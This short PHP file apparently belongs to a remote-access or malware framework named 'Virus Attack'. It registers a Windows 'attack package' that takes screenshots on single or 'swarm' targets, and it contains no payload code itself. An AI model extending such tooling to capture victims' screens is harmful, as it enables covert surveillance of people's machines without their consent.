<?php

use Kelvinho\Virus\Attack\Classes;

/** @var \Kelvinho\Virus\Attack\PackageRegistrar $packageRegistrar */

$packageRegistrar->iRegister("win.oneTime.Screenshot", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\Screenshot\\Screenshot", "easy.Screenshot", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Takes a screenshot");
